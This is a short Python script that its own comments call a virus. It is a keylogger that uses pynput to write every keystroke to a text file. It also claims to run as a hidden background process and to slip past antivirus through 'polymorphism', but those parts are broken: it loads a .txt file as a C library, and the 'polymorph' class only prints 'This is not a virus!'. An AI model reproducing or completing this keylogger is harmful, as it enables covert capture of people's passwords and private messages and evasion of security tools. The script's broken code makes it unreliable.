## Import Commands
from pynput.keyboard import Listener ## This library logs all inputs
import time
import ctypes ## This library allows BG processes to run using the C language

## The code itself

def on_press(key):
    try:
        # Log the pressed key
        with open("keylogger_funny.txt", "a") as log_file:
            log_file.write(f"{key}\n")
    except AttributeError:
        pass ## in case a key cannot be logged


with Listener(on_press=on_press) as listener:
    listener.join()

file = open("keylogger_funny.txt")


## Loading the libray as a background instance

mylib = ctypes.CDLL('keylogger_funny.txt')
mylib.run_background_process()

## Making a polymorphism to attempt to bypass virus filters

class polymorph:
 def __init__(self, innocent):
     self.innocent = innocent

 def innocent_code(self):
     print('This is not a virus!')

class morphing(polymorph):
    def __init__(self, something):
        super().__init__(something)
        
## More info on the virus
## There should be a rough idea of a polymorph
## Polymorphing the virus considering its complexity would be too hard
## The virus should be able to log every key stroke in a .txt file
## the .txt is called ''keylogger_funny.txt''
## the virus also can run as a background process
